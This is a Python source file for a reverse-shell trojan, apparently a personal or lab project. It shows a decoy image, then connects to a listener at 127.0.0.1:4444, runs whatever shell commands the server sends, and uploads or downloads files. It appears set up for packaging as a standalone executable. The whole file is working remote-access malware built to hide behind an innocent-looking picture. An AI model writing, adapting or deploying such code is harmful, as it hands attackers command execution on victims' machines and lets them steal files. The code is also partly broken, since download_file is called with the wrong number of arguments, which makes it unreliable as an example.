import socket
from PIL import Image
import subprocess
import os
import sys

def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")

    return os.path.join(base_path, relative_path)


def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("127.0.0.1", 4444))

    while True:
        command = s.recv(1000).decode()
        print("*************************************")
        print(f"the command from the server is : {command}")
        print("*************************************")

        if command == "exit":
            break
        elif command.startswith("DOWNLOAD"):
            _, file_path, dest_path = command.split()
            download_file(command,s, file_path, dest_path)
        elif command.startswith("UPLOAD"):
            _, file_path, dest_path = command.split()
            upload_file(command,s, file_path, dest_path)
        else:
            output = subprocess.getoutput(command)
            if(len(output) == 0):
                x = "there is no output\n"
                s.send(x.encode())            
            s.send(output.encode())

    s.close()

def download_file(s, file_path, dest_path):
    try:
        with open(dest_path, "wb") as f:
            while True:
                file_data = s.recv(100)
                if file_data == b"DONE": 
                    break
                f.write(file_data)
        print(f"[+] File downloaded from server to '{dest_path}'")
    except FileNotFoundError:
        print(f"[-] File '{file_path}' not found")
        s.send(b"File not found")
    except Exception as e:
        print(f"[-] Error occurred while downloading file: {e}")

def upload_file(whole_thing,s, file_path, dest_path):
    try:
        with open(file_path, "rb") as f:
            while True:
                bytes_read = f.read(100)
                # bytes_read += "|".encode()
                # bytes_read += whole_thing.encode()
                if not bytes_read:
                    break
                s.sendall(bytes_read)
            s.sendall(b"DONE") 
        print(f"[+] File '{file_path}' uploaded from client to server")
    except FileNotFoundError:
        print(f"[-] File '{file_path}' not found")
        s.send(b"File not found")
    except Exception as e:
        print(f"[-] Error occurred while uploading file: {e}")


def main():
    #image1 = Image.open(resource_path("Z.jpg"))
    img = Image.open("/home/amir/Desktop/random_test/reverse_shell/reverse_shell_1/Z.jpg")
    img.show()
    
    connect()

if __name__ == "__main__":
    main()
